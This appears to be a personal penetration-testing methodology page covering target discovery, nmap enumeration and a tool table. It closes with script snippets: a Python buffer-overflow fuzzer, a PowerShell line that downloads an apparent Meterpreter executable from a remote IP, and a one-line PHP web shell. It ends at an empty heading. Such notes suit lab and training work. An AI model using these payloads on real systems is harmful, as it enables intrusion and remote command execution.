---
layout: page
title: 'Tactics Techniques and Procedures (TTP):'
permalink: /process/
published: true
---
## Process

__Target Identification:__

This is sometimes a given if running your own VM but if on the local network and needing to further identify targets:
	- arp-scan --localnet
    - ping sweep - using nmap -sn > insert subnet here
    - passive listening using Wireshark/tcpdump

__Enumeration:__

The never-ending process. The needle in the stack of needles. Here are some methods:

Phase 1:
    - Nmap #1: "Shotgun" scanning via the -A option (optional -sC for running default scripts).
    - Nmap #2: Extended TCP scanning -p1-65535 -sV --reason (with versioning and reason).

Phase 2: Conditional, based on output of Phase1, but often involves the following enumeration tools to find more information on resources the target is exposing:

| Service | Tool | Description |
| --- | --- | ---: |
| Web | Nikto | Vuln Scanner |
| Web | Dirb | Web Directory Scanner |
| Web | Wfuzz | Fuzzer |
| Web | Fimap | Spider/LFI/RFI |
| Web | Curl | Transfer Utility |
| SMB | Enum4linux | Network Share Scanner |
| Various | NetCat | Network Connection Utility |
{:.mbtablestyle}

Of course this is just a small sample of tools, and very focused on web exploitation. In many cases information can be gathered through investigative methods such as:
- Source code viewing (web pages, or scripts on web pages).
- Using the "strings" command to pull readable strings from downloaded files. 
- Utilizing a proxy (such as Burp Suite or Zed Attack Proxy) for analyzing, modifying, or fuzzing information from web services, although this blurrs the line a bit between a somewhat passive enumeration event and active information gathering event.

Supplied tools and intuition are sometimes not enough however and the ability to script ones own tools for the occasion are necessary. What are we if not adaptable, and so the formats used here have to be as varied as the targets. Below are some snippets of scripts that may make parts of these phases easier:

__Script Snips:__

****BASH***  
For loop example:  
	for server in $(cat $1 );do  
	host -t a $server |grep "has address"  
	done  

****Python***  
Simple socket script (with options) for sending incrementing "A's" for determining buffer overflow.  

#!/usr/bin/python  
import socket  

import argparse  

ap = argparse.ArgumentParser()  
ap.add_argument("-ip", "--ipaddress", required=True,  
        help="IP Address of host")  
ap.add_argument("-p", "--port", required=True, type=int,  
        help="Port of host")  
args = vars(ap.parse_args())  

RHOST = args["ipaddress"]  
RPORT = args["port"]  
buffer=["A"]  
counter=100  
while len(buffer) <= 30:  
   buffer.append("A"*counter)  
   counter=counter+200  
for string in buffer:  
   print "Fuzzing with %s bytes" % len(string)  
   s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
   connect=s.connect((RHOST, RPORT))  
   s.send(string + '\r\n')  
   s.recv(1024)  
s.close()  

****Powershell***  
.NET object to download a remote file:  

(new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/met8888.exe','C:\Users\jarrieta\Desktop\met8888.exe')  
****PHP***  
Small Web shell:  

<?php system ($_GET[“cmd”]); ?>  



__BufferOverflow:__  


        
